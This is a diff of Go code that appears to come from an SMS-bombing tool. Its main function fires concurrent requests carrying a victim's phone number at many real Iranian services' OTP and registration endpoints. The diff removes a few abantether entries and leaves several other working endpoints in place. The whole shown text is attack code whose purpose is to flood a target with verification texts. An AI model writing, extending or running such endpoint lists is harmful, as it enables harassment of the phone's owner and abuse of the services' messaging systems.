@@ -366,9 +366,6 @@ func main() {
 		go sms("https://core.pishkhan24.ayantech.ir/webservices/core.svc/v1/LoginByOTP", map[string]interface{}{
 			"null, Username": phone,
 		}, ch)  // edit :4/22/2025
-		go sms("https://api.abantether.com/api/v2/auths/register/phone/send", map[string]interface{}{
-			"phone_number": phone,
-		}, ch)  // edit :4/22/2025
 		go sms("https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code", map[string]interface{}{
 			"mobile": phone,
 		}, ch)  // edit :4/22/2025
@@ -450,13 +447,6 @@ func main() {
 		go sms("https://mamifood.org/Registration.aspx/IsUserAvailable", map[string]interface{}{
 			"cellphone": phone,
 		}, ch)  // edit :4/22/2025
-		go sms("https://api.abantether.com/api/v2/auths/register/phone/send", map[string]interface{}{
-			"phone_number": phone,
-		}, ch)  // edit :4/22/2025
-		s1 := fmt.Sprintf("'phoneNumber':%s ,'email':''", phone)
-		go sms("https://abantether.com/users/register/phone/send/", map[string]interface{}{
-			s1: phone,
-		}, ch) // just check
 		go sms("https://www.glite.ir/wp-admin/admin-ajax.php", map[string]interface{}{
 			"mobileemail": phone,
 		}, ch)  // edit :4/22/2025
